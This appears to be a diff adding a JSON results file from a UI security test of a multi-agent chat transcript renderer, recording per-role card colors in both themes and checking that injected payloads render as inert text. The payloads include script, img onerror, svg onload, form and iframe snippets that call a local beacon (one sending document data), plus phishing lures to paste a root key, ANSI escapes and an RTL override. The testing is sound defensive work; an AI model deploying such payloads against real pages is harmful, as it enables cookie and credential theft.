@@ -1,0 +1,1491 @@
+{
+  "started_at": "2026-08-16T20:42:15.412Z",
+  "chat_id": "80808080-0808-4808-8808-080808080808",
+  "beacon": "http://127.0.0.1:9/p800-808-beacon",
+  "themes": {
+    "dark": {
+      "palette": {
+        "architect": {
+          "bg": "#1b1925",
+          "ink": "#9b8cf0"
+        },
+        "planner": {
+          "bg": "#121d20",
+          "ink": "#4fb0c4"
+        },
+        "builder": {
+          "bg": "#141925",
+          "ink": "#5b8def"
+        },
+        "reviewer": {
+          "bg": "#221f13",
+          "ink": "#d8c24a"
+        },
+        "researcher": {
+          "bg": "#131b16",
+          "ink": "#57a06b"
+        },
+        "scout": {
+          "bg": "#151517",
+          "ink": "#8a8a90"
+        },
+        "steward": {
+          "bg": "#1f1722",
+          "ink": "#c07ad0"
+        },
+        "tester": {
+          "bg": "#211515",
+          "ink": "#cf6360"
+        },
+        "unknown": {
+          "bg": "#19191b",
+          "ink": "#8a8a90"
+        }
+      },
+      "cards": [
+        {
+          "direction": "in",
+          "role": "architect",
+          "peer": "a0000000-0000-4000-8000-00000000000a",
+          "background": "rgb(27, 25, 37)",
+          "borderLeftColor": "rgb(155, 140, 240)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerarchitecta000000011hDesign settled: the control block is a typed payload, not HTML.\n\nforge:ui fenced block\nc"
+        },
+        {
+          "direction": "in",
+          "role": "planner",
+          "peer": "b0000000-0000-4000-8000-00000000000b",
+          "background": "rgb(18, 29, 32)",
+          "borderLeftColor": "rgb(79, 176, 196)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerplannerb000000011hRounds 808a-c sequenced. Builder starts on the tokens."
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hTokens + renderer done. npx tsc --noEmit clean in both repos."
+        },
+        {
+          "direction": "in",
+          "role": "reviewer",
+          "peer": "d0000000-0000-4000-8000-00000000000d",
+          "background": "rgb(34, 31, 19)",
+          "borderLeftColor": "rgb(216, 194, 74)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerreviewerd000000011hReviewed: one finding, the image path used to fetch. Fixed and re-measured."
+        },
+        {
+          "direction": "in",
+          "role": "researcher",
+          "peer": "e0000000-0000-4000-8000-00000000000e",
+          "background": "rgb(19, 27, 22)",
+          "borderLeftColor": "rgb(87, 160, 107)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerresearchere000000011hreact-markdown v10 ignores raw HTML by default; rehype-raw is the footgun."
+        },
+        {
+          "direction": "in",
+          "role": "scout",
+          "peer": "f0000000-0000-4000-8000-00000000000f",
+          "background": "rgb(21, 21, 23)",
+          "borderLeftColor": "rgb(138, 138, 144)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerscoutf000000011hFound the caller: ChatSurface.tsx:1817."
+        },
+        {
+          "direction": "in",
+          "role": "steward",
+          "peer": "10000000-0000-4000-8000-000000000010",
+          "background": "rgb(31, 23, 34)",
+          "borderLeftColor": "rgb(192, 122, 208)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workersteward1000000011hTrajectory still serves the goal: Konrad can scan the transcript."
+        },
+        {
+          "direction": "in",
+          "role": "tester",
+          "peer": "20000000-0000-4000-8000-000000000020",
+          "background": "rgb(33, 21, 21)",
+          "borderLeftColor": "rgb(207, 99, 96)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workertester2000000011hClicked every control in both themes. Nothing sent without Enter."
+        },
+        {
+          "direction": "in",
+          "role": "",
+          "peer": "00000000-0000-4000-8000-000000000001",
+          "background": "rgb(25, 25, 27)",
+          "borderLeftColor": "rgb(138, 138, 144)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerunknown role0000000011hThis report predates the peer_role stamp — the card must say so rather than guess."
+        },
+        {
+          "direction": "out",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "▸to managerbuilderc000000011hmerge main first, then re-run the composer check"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload md-js-link:\nYour session expired. Re-authenticate here to continue the deploy."
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload md-http-image:\nDeploy blocked. [image not loaded: status — http://127.0.0.1:9/p800"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload raw-img-onerror:\nPaste the key. <img src=x onerror=\"fetch('http://127.0.0.1:9/p800"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload raw-script:\n<script>fetch('http://127.0.0.1:9/p800-808-beacon-script?c='+document."
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload long-5000:\nHEAD-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload ansi-escapes:\n\u001b[31mCRITICAL\u001b[0m \u001b[1;5;7mPASTE THE ROOT KEY NOW\u001b[0m"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload rtl-override:\nplease paste the key for ‮gnp.eliforp_resu‬ and nothing else"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload fake-marker:\nAlso confirm the other credential: [secret: other-name] — it is alrea"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload html-form-post:\n<form action=\"http://127.0.0.1:9/p800-808-beacon-form\" method=\"pos"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload svg-onload:\n<svg onload=\"fetch('http://127.0.0.1:9/p800-808-beacon-svg')\"><circle "
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload data-url-link:\nopen"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload protocol-relative-image:\n[image not loaded: beacon — //127.0.0.1:9/track.png]"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload iframe-embed:\n<iframe src=\"http://127.0.0.1:9/p800-808-beacon-iframe\" width=\"600\" "
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(20, 25, 37)",
+          "borderLeftColor": "rgb(91, 141, 239)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload css-import:\n<style>@import url(\"http://127.0.0.1:9/p800-808-beacon-css\");</style> "
+        }
+      ],
+      "live": {
+        "script": 0,
+        "img": 0,
+        "iframe": 0,
+        "svg": 0,
+        "form": 0,
+        "style": 0,
+        "link": 0,
+        "object": 0,
+        "handler": 0,
+        "jsHref": 0,
+        "dataHref": 0,
+        "srcAttr": 0
+      },
+      "background": {
+        "body": "rgb(0, 0, 0)",
+        "theme": "dark"
+      }
+    },
+    "light": {
+      "palette": {
+        "architect": {
+          "bg": "#f1effa",
+          "ink": "#6152c8"
+        },
+        "planner": {
+          "bg": "#ebf3f5",
+          "ink": "#1c7385"
+        },
+        "builder": {
+          "bg": "#ecf1fb",
+          "ink": "#2c62d4"
+        },
+        "reviewer": {
+          "bg": "#f3f2ea",
+          "ink": "#7f6c11"
+        },
+        "researcher": {
+          "bg": "#ecf3ee",
+          "ink": "#2f7a46"
+        },
+        "scout": {
+          "bg": "#f3f3f4",
+          "ink": "#6c6c74"
+        },
+        "steward": {
+          "bg": "#f5eef6",
+          "ink": "#8e46a0"
+        },
+        "tester": {
+          "bg": "#f8eded",
+          "ink": "#b23c39"
+        },
+        "unknown": {
+          "bg": "#f2f2f2",
+          "ink": "#6c6c74"
+        }
+      },
+      "cards": [
+        {
+          "direction": "in",
+          "role": "architect",
+          "peer": "a0000000-0000-4000-8000-00000000000a",
+          "background": "rgb(241, 239, 250)",
+          "borderLeftColor": "rgb(97, 82, 200)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerarchitecta000000011hDesign settled: the control block is a typed payload, not HTML.\n\nforge:ui fenced block\nc"
+        },
+        {
+          "direction": "in",
+          "role": "planner",
+          "peer": "b0000000-0000-4000-8000-00000000000b",
+          "background": "rgb(235, 243, 245)",
+          "borderLeftColor": "rgb(28, 115, 133)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerplannerb000000011hRounds 808a-c sequenced. Builder starts on the tokens."
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hTokens + renderer done. npx tsc --noEmit clean in both repos."
+        },
+        {
+          "direction": "in",
+          "role": "reviewer",
+          "peer": "d0000000-0000-4000-8000-00000000000d",
+          "background": "rgb(243, 242, 234)",
+          "borderLeftColor": "rgb(127, 108, 17)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerreviewerd000000011hReviewed: one finding, the image path used to fetch. Fixed and re-measured."
+        },
+        {
+          "direction": "in",
+          "role": "researcher",
+          "peer": "e0000000-0000-4000-8000-00000000000e",
+          "background": "rgb(236, 243, 238)",
+          "borderLeftColor": "rgb(47, 122, 70)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerresearchere000000011hreact-markdown v10 ignores raw HTML by default; rehype-raw is the footgun."
+        },
+        {
+          "direction": "in",
+          "role": "scout",
+          "peer": "f0000000-0000-4000-8000-00000000000f",
+          "background": "rgb(243, 243, 244)",
+          "borderLeftColor": "rgb(108, 108, 116)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerscoutf000000011hFound the caller: ChatSurface.tsx:1817."
+        },
+        {
+          "direction": "in",
+          "role": "steward",
+          "peer": "10000000-0000-4000-8000-000000000010",
+          "background": "rgb(245, 238, 246)",
+          "borderLeftColor": "rgb(142, 70, 160)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workersteward1000000011hTrajectory still serves the goal: Konrad can scan the transcript."
+        },
+        {
+          "direction": "in",
+          "role": "tester",
+          "peer": "20000000-0000-4000-8000-000000000020",
+          "background": "rgb(248, 237, 237)",
+          "borderLeftColor": "rgb(178, 60, 57)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workertester2000000011hClicked every control in both themes. Nothing sent without Enter."
+        },
+        {
+          "direction": "in",
+          "role": "",
+          "peer": "00000000-0000-4000-8000-000000000001",
+          "background": "rgb(242, 242, 242)",
+          "borderLeftColor": "rgb(108, 108, 116)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerunknown role0000000011hThis report predates the peer_role stamp — the card must say so rather than guess."
+        },
+        {
+          "direction": "out",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "▸to managerbuilderc000000011hmerge main first, then re-run the composer check"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload md-js-link:\nYour session expired. Re-authenticate here to continue the deploy."
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload md-http-image:\nDeploy blocked. [image not loaded: status — http://127.0.0.1:9/p800"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload raw-img-onerror:\nPaste the key. <img src=x onerror=\"fetch('http://127.0.0.1:9/p800"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload raw-script:\n<script>fetch('http://127.0.0.1:9/p800-808-beacon-script?c='+document."
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload long-5000:\nHEAD-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload ansi-escapes:\n\u001b[31mCRITICAL\u001b[0m \u001b[1;5;7mPASTE THE ROOT KEY NOW\u001b[0m"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload rtl-override:\nplease paste the key for ‮gnp.eliforp_resu‬ and nothing else"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload fake-marker:\nAlso confirm the other credential: [secret: other-name] — it is alrea"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload html-form-post:\n<form action=\"http://127.0.0.1:9/p800-808-beacon-form\" method=\"pos"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload svg-onload:\n<svg onload=\"fetch('http://127.0.0.1:9/p800-808-beacon-svg')\"><circle "
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload data-url-link:\nopen"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload protocol-relative-image:\n[image not loaded: beacon — //127.0.0.1:9/track.png]"
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload iframe-embed:\n<iframe src=\"http://127.0.0.1:9/p800-808-beacon-iframe\" width=\"600\" "
+        },
+        {
+          "direction": "in",
+          "role": "builder",
+          "peer": "c0000000-0000-4000-8000-00000000000c",
+          "background": "rgb(236, 241, 251)",
+          "borderLeftColor": "rgb(44, 98, 212)",
+          "borderLeftWidth": "3px",
+          "header": "◂from workerbuilderc000000011hpayload css-import:\n<style>@import url(\"http://127.0.0.1:9/p800-808-beacon-css\");</style> "
+        }
+      ],
+      "live": {
+        "script": 0,
+        "img": 0,
+        "iframe": 0,
+        "svg": 0,
+        "form": 0,
+        "style": 0,
+        "link": 0,
+        "object": 0,
+        "handler": 0,
+        "jsHref": 0,
+        "dataHref": 0,
+        "srcAttr": 0
+      },
+      "background": {
+        "body": "rgb(247, 247, 245)",
+        "theme": "light"
+      }
+    }
+  },
+  "requests": {
+    "total": 51,
+    "beaconHits": []
+  },
+  "results": [
+    {
+      "name": "dark: sampled body background",
+      "note": {
+        "body": "rgb(0, 0, 0)",
+        "theme": "dark"
+      }
+    },
+    {
+      "name": "dark — one card per role, plus the unstamped one, the echo and the payloads",
+      "ok": true,
+      "actual": 24,
+      "expected": 24
+    },
+    {
+      "name": "dark — architect has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — architect paints --fg-roleBgarchitect (#1b1925)",
+      "ok": true,
+      "actual": "rgb(27, 25, 37)",
+      "expected": "rgb(27, 25, 37)"
+    },
+    {
+      "name": "dark — architect's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(155, 140, 240)",
+      "expected": "rgb(155, 140, 240)"
+    },
+    {
+      "name": "dark — architect's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — planner has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — planner paints --fg-roleBgplanner (#121d20)",
+      "ok": true,
+      "actual": "rgb(18, 29, 32)",
+      "expected": "rgb(18, 29, 32)"
+    },
+    {
+      "name": "dark — planner's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(79, 176, 196)",
+      "expected": "rgb(79, 176, 196)"
+    },
+    {
+      "name": "dark — planner's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — builder has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — builder paints --fg-roleBgbuilder (#141925)",
+      "ok": true,
+      "actual": "rgb(20, 25, 37)",
+      "expected": "rgb(20, 25, 37)"
+    },
+    {
+      "name": "dark — builder's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(91, 141, 239)",
+      "expected": "rgb(91, 141, 239)"
+    },
+    {
+      "name": "dark — builder's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — reviewer has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — reviewer paints --fg-roleBgreviewer (#221f13)",
+      "ok": true,
+      "actual": "rgb(34, 31, 19)",
+      "expected": "rgb(34, 31, 19)"
+    },
+    {
+      "name": "dark — reviewer's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(216, 194, 74)",
+      "expected": "rgb(216, 194, 74)"
+    },
+    {
+      "name": "dark — reviewer's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — researcher has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — researcher paints --fg-roleBgresearcher (#131b16)",
+      "ok": true,
+      "actual": "rgb(19, 27, 22)",
+      "expected": "rgb(19, 27, 22)"
+    },
+    {
+      "name": "dark — researcher's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(87, 160, 107)",
+      "expected": "rgb(87, 160, 107)"
+    },
+    {
+      "name": "dark — researcher's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — scout has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — scout paints --fg-roleBgscout (#151517)",
+      "ok": true,
+      "actual": "rgb(21, 21, 23)",
+      "expected": "rgb(21, 21, 23)"
+    },
+    {
+      "name": "dark — scout's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(138, 138, 144)",
+      "expected": "rgb(138, 138, 144)"
+    },
+    {
+      "name": "dark — scout's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — steward has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — steward paints --fg-roleBgsteward (#1f1722)",
+      "ok": true,
+      "actual": "rgb(31, 23, 34)",
+      "expected": "rgb(31, 23, 34)"
+    },
+    {
+      "name": "dark — steward's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(192, 122, 208)",
+      "expected": "rgb(192, 122, 208)"
+    },
+    {
+      "name": "dark — steward's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — tester has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — tester paints --fg-roleBgtester (#211515)",
+      "ok": true,
+      "actual": "rgb(33, 21, 21)",
+      "expected": "rgb(33, 21, 21)"
+    },
+    {
+      "name": "dark — tester's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(207, 99, 96)",
+      "expected": "rgb(207, 99, 96)"
+    },
+    {
+      "name": "dark — tester's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "dark — every role's tint is DISTINCT (that is the whole feature)",
+      "ok": true,
+      "actual": 8,
+      "expected": 8
+    },
+    {
+      "name": "dark — exactly one outbound echo",
+      "ok": true,
+      "actual": 1,
+      "expected": 1
+    },
+    {
+      "name": "dark — the echo says \"to\"",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the echo carries the arrow",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the unstamped peer has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — ...and it says \"unknown role\" rather than guessing",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — ...and takes the neutral tint",
+      "ok": true,
+      "actual": "rgb(25, 25, 27)",
+      "expected": "rgb(25, 25, 27)"
+    },
+    {
+      "name": "dark — no live node anywhere in the transcript",
+      "ok": true,
+      "actual": {
+        "script": 0,
+        "img": 0,
+        "iframe": 0,
+        "svg": 0,
+        "form": 0,
+        "style": 0,
+        "link": 0,
+        "object": 0,
+        "handler": 0,
+        "jsHref": 0,
+        "dataHref": 0,
+        "srcAttr": 0
+      },
+      "expected": {
+        "script": 0,
+        "img": 0,
+        "iframe": 0,
+        "svg": 0,
+        "form": 0,
+        "style": 0,
+        "link": 0,
+        "object": 0,
+        "handler": 0,
+        "jsHref": 0,
+        "dataHref": 0,
+        "srcAttr": 0
+      }
+    },
+    {
+      "name": "dark — payload md-js-link is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload md-http-image is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload raw-img-onerror is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload raw-script is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload long-5000 is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload ansi-escapes is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload rtl-override is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload fake-marker is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload html-form-post is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload svg-onload is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload data-url-link is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload protocol-relative-image is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload iframe-embed is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — payload css-import is on screen (nothing swallowed)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the escaped script tag is TEXT",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the escaped img tag is TEXT",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the image URL is shown as a marker, not loaded",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the choice block renders two options",
+      "ok": true,
+      "actual": 2,
+      "expected": 2
+    },
+    {
+      "name": "dark — and they are ENABLED here (the manager chat has a composer)",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "dark — the secret block renders",
+      "ok": true,
+      "actual": 1,
+      "expected": 1
+    },
+    {
+      "name": "dark — nothing was mis-parsed into an invalid block",
+      "ok": true,
+      "actual": 0,
+      "expected": 0
+    },
+    {
+      "name": "dark: screenshot (payload end of the thread)",
+      "note": "phase800-808-transcript-dark.png"
+    },
+    {
+      "name": "dark: screenshot (every role tint on one screen)",
+      "note": "phase800-808-roles-dark.png"
+    },
+    {
+      "name": "light: sampled body background",
+      "note": {
+        "body": "rgb(247, 247, 245)",
+        "theme": "light"
+      }
+    },
+    {
+      "name": "light — one card per role, plus the unstamped one, the echo and the payloads",
+      "ok": true,
+      "actual": 24,
+      "expected": 24
+    },
+    {
+      "name": "light — architect has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — architect paints --fg-roleBgarchitect (#f1effa)",
+      "ok": true,
+      "actual": "rgb(241, 239, 250)",
+      "expected": "rgb(241, 239, 250)"
+    },
+    {
+      "name": "light — architect's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(97, 82, 200)",
+      "expected": "rgb(97, 82, 200)"
+    },
+    {
+      "name": "light — architect's rule is 3px",
+      "ok": true,
+      "actual": "3px",
+      "expected": "3px"
+    },
+    {
+      "name": "light — planner has a card",
+      "ok": true,
+      "actual": true,
+      "expected": true
+    },
+    {
+      "name": "light — planner paints --fg-roleBgplanner (#ebf3f5)",
+      "ok": true,
+      "actual": "rgb(235, 243, 245)",
+      "expected": "rgb(235, 243, 245)"
+    },
+    {
+      "name": "light — planner's left rule is its ink",
+      "ok": true,
+      "actual": "rgb(28, 115, 133)",
